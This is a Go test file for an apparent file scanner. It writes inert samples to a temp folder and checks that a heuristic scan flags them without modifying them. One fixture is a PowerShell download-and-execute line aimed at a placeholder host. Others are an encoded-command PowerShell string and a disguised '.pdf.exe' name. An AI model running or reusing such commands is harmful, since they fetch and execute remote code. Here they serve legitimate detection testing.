package main

import (
 "os"
 "path/filepath"
 "testing"
)

// Preserve the historical test name, but DO NOT exempt entire files from
// scanning. The replacement checks function-level process API allowlists,
// native NewProc handles and scanner call-graph reachability.
func TestSafetyPassiveScanCannotSpawnShells(t *testing.T) {
 TestSecurityProcessCreationFunctionAllowlistAndReachability(t)
}

// Inspect ordinary inert content through the same custom-scan worker pipeline
// used by full scan, without running any of the example commands.
func TestSafetyPassiveScanOfMixedContentIsReadOnly(t *testing.T) {
    root:=t.TempDir()
    fixtures:=map[string]string{
        "normal.txt": "Readable text only",
        "incident.ps1": "IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/x')",
        "document.pdf": "%PDF-1.7\n1 0 obj <</Type /Catalog >>",
        "invoice.pdf.exe": "Not a real binary: inert double-extension fixture",
        "shortcut.lnk": "powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    }
    for name,data:=range fixtures{
        p:=filepath.Join(root,"nested",name)
        if err:=os.MkdirAll(filepath.Dir(p),0700);err!=nil{t.Fatal(err)}
        if err:=os.WriteFile(p,[]byte(data),0600);err!=nil{t.Fatal(err)}
    }
    a:=newApp(nil)
    ctx,err:=a.begin("heuristic:custom")
    if err!=nil{t.Fatal(err)}
    err=a.runHeuristic(ctx,"custom",root)
    a.finish(err)
    if err!=nil{t.Fatal(err)}
    st,_:=a.snapshot()
    if st.Files!=int64(len(fixtures)){t.Fatalf("expected %d files read, got %d",len(fixtures),st.Files)}
    if st.Findings==0 {t.Fatal("suspicious inert samples did not produce any findings")}
    for name,want:=range fixtures{
        b,err:=os.ReadFile(filepath.Join(root,"nested",name))
        if err!=nil||string(b)!=want{t.Fatalf("read-only scan modified sample %q",name)}
    }
}
